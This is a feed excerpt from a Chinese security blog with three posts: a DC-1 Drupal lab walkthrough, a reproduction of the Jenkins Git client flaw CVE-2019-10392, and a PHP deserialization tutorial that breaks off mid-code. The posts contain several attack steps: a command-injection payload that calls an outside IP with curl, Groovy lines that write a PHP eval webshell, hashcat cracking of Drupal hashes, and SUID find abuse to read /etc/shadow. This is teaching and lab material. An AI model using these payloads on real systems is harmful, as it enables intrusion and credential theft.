    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做了一下DC1到DC6的靶机渗透，简单记录一下过程</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>CVE-2018-7600 Drupal核心远程代码执行漏洞<br>drupal配置文件和重置管理员密码<br>suid提权</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Nmap扫一下端口发现<br>80端口是drupal 7 服务<br>111 端口是 rpcbind服务</p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>用msf开始搜一下drupal漏洞<br><img src="/2019/10/16/DC-1渗透报告/1562240397838.png" alt="Alt text"><br>选一个漏洞设置远程IP地址开始攻击<br><img src="/2019/10/16/DC-1渗透报告/1562240478760.png" alt="Alt text"><br>反弹回一个msf的shell  目录下有flag1<br><img src="/2019/10/16/DC-1渗透报告/1562240673845.png" alt="Alt text"><br>在/sites/default目录下有数据库配置文件 有flag2和数据库用户名密码<br><img src="/2019/10/16/DC-1渗透报告/1562240636851.png" alt="Alt text"><br>登入数据库  有管理员用户名及密码hash<br><img src="/2019/10/16/DC-1渗透报告/1562240709606.png" alt="Alt text"><br>这里有两种方法<br>第一种使用hashcat暴力破解，使用网上的常用密码字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ ./hashcat64.exe -m 7900 hashes.txt rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">OpenCL Platform #1: NVIDIA Corporation</span><br><span class="line">======================================</span><br><span class="line">* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCU</span><br><span class="line"></span><br><span class="line">Hashes: 3 digests; 3 unique digests, 3 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Uses-64-Bit</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344391</span><br><span class="line">* Bytes.....: 139921497</span><br><span class="line">* Keyspace..: 14344384</span><br><span class="line">* Runtime...: 2 secs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR:53cr3t</span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Type........: Drupal7</span><br><span class="line">Hash.Target......: hashes.txt</span><br><span class="line">Time.Started.....: Fri Mar 08 09:19:57 2019 (7 mins, 52 secs)</span><br><span class="line">Time.Estimated...: Fri Mar 08 09:27:49 2019 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    36639 H/s (2.15ms) @ Accel:128 Loops:32 Thr:64 Vec:1</span><br><span class="line">Recovered........: 2/3 (66.67%) Digests, 2/3 (66.67%) Salts</span><br><span class="line">Progress.........: 43033152/43033152 (100.00%)</span><br><span class="line">Rejected.........: 0/43033152 (0.00%)</span><br><span class="line">Restore.Point....: 14344384/14344384 (100.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:16352-16384</span><br><span class="line">Candidates.#1....: $HEX[284d6f75746f6e] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br><span class="line">Hardware.Mon.#1..: Temp: 69c Fan: 47% Util: 96% Core:1809MHz Mem:3802MHz Bus:16</span><br></pre></td></tr></table></figure></p><p>密码是53cr3t。</p><p>方法二是通过数据库操作修改密码<br>参考链接：<br><a href="https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima" target="_blank" rel="external">https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima</a></p><p>用drupal自带的 password-hash.sh 加密 drupal<br><img src="/2019/10/16/DC-1渗透报告/1562315416008.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&apos;$S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v&apos; where name=&apos;admin&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/16/DC-1渗透报告/1562315497833.png" alt="Alt text"><br>然后回浏览器登录</p><p>翻一下后台发现flag3<br><img src="/2019/10/16/DC-1渗透报告/1562315539055.png" alt="Alt text"><br><img src="/2019/10/16/DC-1渗透报告/1562315586255.png" alt="Alt text"><br>提示查看shadow文件<br>继续翻目录翻到flag4<br><img src="/2019/10/16/DC-1渗透报告/1562316316583.png" alt="Alt text"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">https://github.com/rebootuser/LinEnum</a><br>wget下载这个脚本跑一下<br><img src="/2019/10/16/DC-1渗透报告/1562316619894.png" alt="Alt text"><br>发现提示可能有SUID提权<br>之前flag也提示了用find命令</p><pre><code>find /etc/shadow -exec cat {} \;&gt; all.txt</code></pre><p><img src="/2019/10/16/DC-1渗透报告/1562316739537.png" alt="Alt text"><br>拿到密码hash，然后用john跑一下<br><img src="/2019/10/16/DC-1渗透报告/1562316785690.png" alt="Alt text"></p><p>也可以直接读flag5文件<br><img src="/2019/10/16/DC-1渗透报告/1562316870962.png" alt="Alt text"><br>完成</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://gv7.me/articles/2017/batch-crack-shadows/" target="_blank" rel="external">http://gv7.me/articles/2017/batch-crack-shadows/</a><br><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="external">https://www.anquanke.com/post/id/86979</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;做了一下DC1到DC6的靶机渗透，简单记录一下过程&lt;/p&gt;
&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://www.twosmi1e.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10392：Jenkins Git client插件RCE复现</title>
    <link href="https://www.twosmi1e.com/2019/10/16/CVE-2019-10392%EF%BC%9AJenkins-Git-client%E6%8F%92%E4%BB%B6RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.twosmi1e.com/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/</id>
    <published>2019-10-16T06:03:38.000Z</published>
    <updated>2019-10-16T06:08:20.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://jenkins.io/security/advisory/2019-09-12/" target="_blank" rel="external">https://jenkins.io/security/advisory/2019-09-12/</a><br>Git客户端插件接受用户指定的值作为git ls-remote调用的参数，以验证指定URL处是否存在Git存储库。 这种方式允许具有Job / Configure权限的攻击者，以运行Jenkins进程的OS用户的权限在Jenkins主服务器上执行任意系统命令。当以root权限运行Jenkins时，攻击者将会通过攻击得到root权限。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Git client Plugin &lt;= 2.8.4</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用docker搭建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search jenkins</span><br><span class="line">docker pull jenkins/jenkins</span><br><span class="line">映射8080端口</span><br><span class="line">docker run -d -p 8080:8080 -p 50000:50000 jenkins/jenkins</span><br></pre></td></tr></table></figure></p><p>访问IP:8080后需要输入密码<br>进入容器获取密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 79931fdd69d5 /bin/bash</span><br><span class="line">jenkins@79931fdd69d5:/$ cat /var/jenkins_home/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure></p><p>开始安装<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701368800.png" alt="Alt text"><br>安装完成后会让你创建用户，随便创建一个后进入界面。<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701989181.png" alt="Alt text"><br>选择Manage来新建用户<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702166984.png" alt="Alt text"><br>创建一个非管理员用户并在Configure Global Security里给予如图权限<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702599654.png" alt="Alt text"><br>下载漏洞版本插件<br><a href="http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi</a><br><a href="http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi</a><br>将两个插件上传<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570761278914.png" alt="Alt text"><br>安装完成后重启<img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570762944751.png" alt="Alt text"><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570763755386.png" alt="Alt text"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录创建的非管理用户<br>创建一个流水线任务</p><p>在连接git仓库处输入payload<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764278108.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`ls`&quot;</span><br></pre></td></tr></table></figure></p><p>反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`curl http://106.54.229.29:9999`&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764547092.png" alt="Alt text"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看文档<a href="https://git-scm.com/docs/git-ls-remote.html" target="_blank" rel="external">https://git-scm.com/docs/git-ls-remote.html</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570772486756.png" alt="Alt text"><br>在远程主机上指定git-upload-pack的完整路径。 这允许列出通过SSH访问的存储库中的引用，并且SSH守护程序不使用用户配置的PATH。由此可以在服务器上执行任意命令。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>实际上是一个比较鸡肋的洞，服务器上必须要低版本插件，并且配合弱口令或者未授权才能进入后台利用。</p><p>其实在后台有个地方能直接执行命令<br>在<a href="http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。" target="_blank" rel="external">http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570773935872.png" alt="Alt text"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">println(&quot;id&quot;.execute().getText())</span><br><span class="line"></span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[test]);?&gt;&apos;);</span><br><span class="line"></span><br><span class="line">def webshell = &apos;&lt;?php @eval($_POST[test]);?&gt;&apos;</span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&quot;$webshell&quot;);</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-09-12/&quot; tar
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://www.twosmi1e.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://www.twosmi1e.com/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://www.twosmi1e.com/2018/12/20/PHP反序列化/</id>
    <published>2018-12-20T12:00:54.000Z</published>
    <updated>2018-12-25T11:06:59.166Z</updated>
    
    <content type="html"><![CDATA[<p>从浅至深来记录一下PHP反序列化的知识。本文首发于<a href="https://xz.aliyun.com/t/3674" target="_blank" rel="external">先知社区</a>,转载请注明来源</p><h2 id="0x00-PHP序列化是什么"><a href="#0x00-PHP序列化是什么" class="headerlink" title="0x00 PHP序列化是什么"></a>0x00 PHP序列化是什么</h2><h3 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()    <span class="comment">//将一个对象转换成一个字符串</span></span><br><span class="line">unserialize()<span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line"><span class="keyword">public</span> $a = <span class="string">"aaa"</span>;</span><br><span class="line"><span class="keyword">static</span> $b = <span class="string">"bbb"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="keyword">new</span> test;</span><br><span class="line">$data = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化可以控制类属性，无论是private还是public<br><img src="/2018/12/20/PHP反序列化/1542683244179.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:10:&quot;testflag&quot;;s:9:&quot;flag&#123;233&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;</span><br><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure></p><p>这里说明一下序列化字符串的含义：<br><code>O:4:&quot;test&quot;</code>指Object(对象) 4个字符:test<br><code>:2</code>对象属性个数为2<br>{}中为属性字符数：属性值</p><p><strong>注意：</strong>可以看到testflag的长度为8，序列化中却显示长度为10。这是因为它是private属性，翻阅文档就会在两侧加入空字节。<br><img src="/2018/12/20/PHP反序列化/1542683756635.png" alt="Alt text"><br>所以在传入序列化字符串进行反序列化时需要注意补齐两个空字节。</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span>;</span><br><span class="line">$data = urldecode($str);</span><br><span class="line">$obj = unserialize($data);</span><br><span class="line"></span><br><span class="line">var_dump($obj);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2018/12/20/PHP反序列化/1542687588777.png" alt="Alt text"></p><h2 id="0x01-魔术方法"><a href="#0x01-魔术方法" class="headerlink" title="0x01 魔术方法"></a>0x01 魔术方法</h2><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p>实例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line"><span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line">$temp = serialize($me);</span><br><span class="line"><span class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$me = unserialize($temp);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>运行结果：<br><img src="/2018/12/20/PHP反序列化/1544258803318.png" alt="Alt text"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line"><span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString:'</span> . $me . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/2018/12/20/PHP反序列化/1544260686584.png" alt="Alt text"></p><h3 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h3><p>这是D0g3平台一道很简单的反序列化的题，GET读str内容进行反序列化等于$KEY就get flag了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$KEY = <span class="string">"D0g3!!!"</span>;</span><br><span class="line">$str = $_GET[<span class="string">'str'</span>];</span><br><span class="line"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>payload:<code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code></p><h2 id="0x02-反序列化对象注入"><a href="#0x02-反序列化对象注入" class="headerlink" title="0x02 反序列化对象注入"></a>0x02 反序列化对象注入</h2><h3 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a>绕过__wakeup()方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 